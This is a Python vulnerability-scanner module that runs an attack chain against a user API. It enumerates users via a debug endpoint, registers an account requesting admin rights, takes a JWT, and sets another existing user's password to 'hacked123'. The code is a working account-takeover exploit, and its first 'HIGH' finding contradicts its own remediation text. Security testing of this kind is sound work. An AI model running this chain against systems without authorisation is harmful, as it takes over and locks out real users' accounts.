#!/usr/bin/env python3
"""
Password Change Vulnerability Scanner
Checks if an API endpoint is vulnerable to unauthorized password changes
by following a complete attack chain:
1. Enumerate users via debug endpoint
2. Register a new test user
3. Verify user creation
4. Login to obtain JWT token
5. Change password using the token
6. Verify password change by logging in with new credentials
"""

import requests
import time
import uuid
from typing import Dict, List, Optional, Any
from .base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class PasswordChangeVulnScanner(BaseScanner):
    def __init__(self):
        super().__init__()
        self.logger = setup_scanner_logger("password_change_vuln")
        self.target = None
        
    def scan(self, url: str, method: str, path: str, response: requests.Response, token: Optional[str] = None, 
             headers: Optional[Dict[str, str]] = None, tokens: Optional[Dict[str, List[Dict[str, Any]]]] = None, 
             context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
        self.base_url = url
        self.target = url
        vulnerabilities = []
        
        # Generate correlation ID for tracking related requests
        correlation_id = str(uuid.uuid4())
        
        # Headers setup
        request_headers = headers or {}
        request_headers['Content-Type'] = 'application/json'
        
        try:
            # Step 1: Check debug endpoint to enumerate users
            self.logger.info("Step 1: Checking debug endpoint to enumerate users")
            debug_url = f"{url}/users/v1/_debug"
            debug_resp = requests.get(
                debug_url,
                timeout=5
            )
            
            # Capture evidence of debug endpoint access
            debug_req, debug_res = self.capture_transaction(
                debug_resp,
                auth_state={"auth_type": "none"},
                correlation_id=correlation_id
            )
            
            initial_users = []
            if debug_resp.status_code == 200:
                debug_data = debug_resp.json()
                initial_users = debug_data.get("users", [])
                self.logger.info(f"Found {len(initial_users)} users in debug endpoint")
                
                # Step 2: Register a new test user
                self.logger.info("Step 2: Registering a new test user")
                test_username = f"test_pwd_change_{int(time.time())}"
                test_password = "test_password1"
                test_new_password = "changed_password2"
                
                register_payload = {
                    "username": test_username,
                    "password": test_password,
                    "email": f"{test_username}@example.com",
                    "admin": True  # Attempting to set admin privilege
                }
                
                register_url = f"{url}/users/v1/register"
                register_resp = requests.post(
                    register_url,
                    json=register_payload,
                    headers=request_headers,
                    timeout=5
                )
                
                # Capture evidence of registration
                register_req, register_res = self.capture_transaction(
                    register_resp,
                    auth_state={"auth_type": "none"},
                    correlation_id=correlation_id
                )
                
                if register_resp.status_code == 200:
                    self.logger.info(f"Successfully registered user {test_username}")
                    
                    # Step 3: Verify user creation via debug endpoint
                    self.logger.info("Step 3: Verifying user creation")
                    verify_resp = requests.get(debug_url, timeout=5)
                    
                    if verify_resp.status_code == 200:
                        verify_data = verify_resp.json()
                        final_users = verify_data.get("users", [])
                        
                        # Find our newly created user
                        new_user = next(
                            (u for u in final_users if u.get("username") == test_username), 
                            None
                        )
                        
                        # Capture evidence of verification
                        verify_req, verify_res = self.capture_transaction(
                            verify_resp,
                            auth_state={"auth_type": "none"},
                            correlation_id=correlation_id
                        )
                        
                        if new_user:
                            self.logger.info(f"Verified user {test_username} was created")
                            
                            # Step 4: Login to obtain JWT token
                            self.logger.info("Step 4: Logging in to obtain JWT token")
                            login_payload = {
                                "username": test_username,
                                "password": test_password
                            }
                            
                            login_url = f"{url}/users/v1/login"
                            login_resp = requests.post(
                                login_url,
                                json=login_payload,
                                headers=request_headers,
                                timeout=5
                            )
                            
                            # Capture evidence of login
                            login_req, login_res = self.capture_transaction(
                                login_resp,
                                auth_state={"auth_type": "none"},
                                correlation_id=correlation_id
                            )
                            
                            if login_resp.status_code == 200:
                                login_data = login_resp.json()
                                auth_token = login_data.get("auth_token")
                                
                                if auth_token:
                                    self.logger.info(f"Successfully obtained JWT token for {test_username}")
                                    
                                    # Step 5: Change password using the token
                                    self.logger.info("Step 5: Changing password using the token")
                                    change_headers = request_headers.copy()
                                    change_headers["Authorization"] = f"Bearer {auth_token}"
                                    
                                    change_url = f"{url}/users/v1/{test_username}/password"
                                    change_payload = {"password": test_new_password}
                                    
                                    change_resp = requests.put(
                                        change_url,
                                        json=change_payload,
                                        headers=change_headers,
                                        timeout=5
                                    )
                                    
                                    # Capture evidence of password change
                                    change_req, change_res = self.capture_transaction(
                                        change_resp,
                                        auth_state={"auth_type": "bearer", "token": auth_token},
                                        correlation_id=correlation_id
                                    )
                                    
                                    if change_resp.status_code in [200, 204]:
                                        self.logger.info(f"Successfully changed password for {test_username}")
                                        
                                        # Step 6: Verify password change by logging in with new password
                                        self.logger.info("Step 6: Verifying password change by logging in with new password")
                                        verify_login_payload = {
                                            "username": test_username,
                                            "password": test_new_password
                                        }
                                        
                                        verify_login_resp = requests.post(
                                            login_url,
                                            json=verify_login_payload,
                                            headers=request_headers,
                                            timeout=5
                                        )
                                        
                                        # Capture evidence of verification login
                                        verify_login_req, verify_login_res = self.capture_transaction(
                                            verify_login_resp,
                                            auth_state={"auth_type": "none"},
                                            correlation_id=correlation_id
                                        )
                                        
                                        if verify_login_resp.status_code == 200:
                                            self.logger.info("Password change verified successfully")
                                            
                                            # Add vulnerability finding
                                            vulnerabilities.append({
                                                "type": "PASSWORD_CHANGE_VULNERABILITY",
                                                "severity": "HIGH",
                                                "detail": "Successfully demonstrated complete password change flow",
                                                "evidence": {
                                                    "debug": {
                                                        "request": debug_req,
                                                        "response": debug_res
                                                    },
                                                    "registration": {
                                                        "request": register_req,
                                                        "response": register_res,
                                                        "payload": register_payload
                                                    },
                                                    "verification": {
                                                        "request": verify_req,
                                                        "response": verify_res,
                                                        "new_user": new_user
                                                    },
                                                    "login": {
                                                        "request": login_req,
                                                        "response": login_res,
                                                        "auth_token": auth_token
                                                    },
                                                    "password_change": {
                                                        "request": change_req,
                                                        "response": change_res
                                                    },
                                                    "verification_login": {
                                                        "request": verify_login_req,
                                                        "response": verify_login_res
                                                    },
                                                    "correlation_id": correlation_id
                                                },
                                                "remediation": {
                                                    "description": "Password change functionality is properly implemented but should be monitored for abuse",
                                                    "impact": "Legitimate password changes are possible, but could be abused if authorization is not properly enforced",
                                                    "steps": [
                                                        "Ensure proper authorization checks for password changes",
                                                        "Require current password verification for added security",
                                                        "Implement rate limiting for password change attempts",
                                                        "Send notifications for password changes",
                                                        "Monitor for unusual password change patterns"
                                                    ]
                                                }
                                            })
                                            
                                            # Try to change another user's password (unauthorized attempt)
                                            if len(initial_users) > 0:
                                                target_user = next((u for u in initial_users if u.get("username") != test_username), None)
                                                
                                                if target_user:
                                                    target_username = target_user.get("username")
                                                    self.logger.info(f"Attempting unauthorized password change for {target_username}")
                                                    
                                                    unauth_change_url = f"{url}/users/v1/{target_username}/password"
                                                    unauth_change_resp = requests.put(
                                                        unauth_change_url,
                                                        json={"password": "hacked123"},
                                                        headers=change_headers,
                                                        timeout=5
                                                    )
                                                    
                                                    # Capture evidence of unauthorized attempt
                                                    unauth_req, unauth_res = self.capture_transaction(
                                                        unauth_change_resp,
                                                        auth_state={"auth_type": "bearer", "token": auth_token},
                                                        correlation_id=correlation_id
                                                    )
                                                    
                                                    if unauth_change_resp.status_code in [200, 204]:
                                                        self.logger.warning(f"CRITICAL: Unauthorized password change successful for {target_username}")
                                                        
                                                        vulnerabilities.append({
                                                            "type": "UNAUTHORIZED_PASSWORD_CHANGE",
                                                            "severity": "CRITICAL",
                                                            "detail": f"Successfully changed password for user {target_username} using token from {test_username}",
                                                            "evidence": {
                                                                "unauthorized_attempt": {
                                                                    "request": unauth_req,
                                                                    "response": unauth_res,
                                                                    "target_user": target_username,
                                                                    "attacker_user": test_username
                                                                },
                                                                "auth_token": auth_token,
                                                                "correlation_id": correlation_id
                                                            },
                                                            "remediation": {
                                                                "description": "Critical vulnerability allows unauthorized password changes",
                                                                "impact": "Account takeover, privilege escalation, unauthorized access",
                                                                "steps": [
                                                                    "Implement proper authorization checks for password changes",
                                                                    "Verify user identity before allowing password changes",
                                                                    "Add proper path parameter validation",
                                                                    "Ensure JWT claims are properly validated",
                                                                    "Add additional authentication for sensitive operations"
                                                                ]
                                                            }
                                                        })
        except requests.RequestException as e:
            self.logger.error(f"Error in password change vulnerability check: {str(e)}")
            
        return vulnerabilities

# Keep the scan function for backward compatibility
scan = PasswordChangeVulnScanner().scan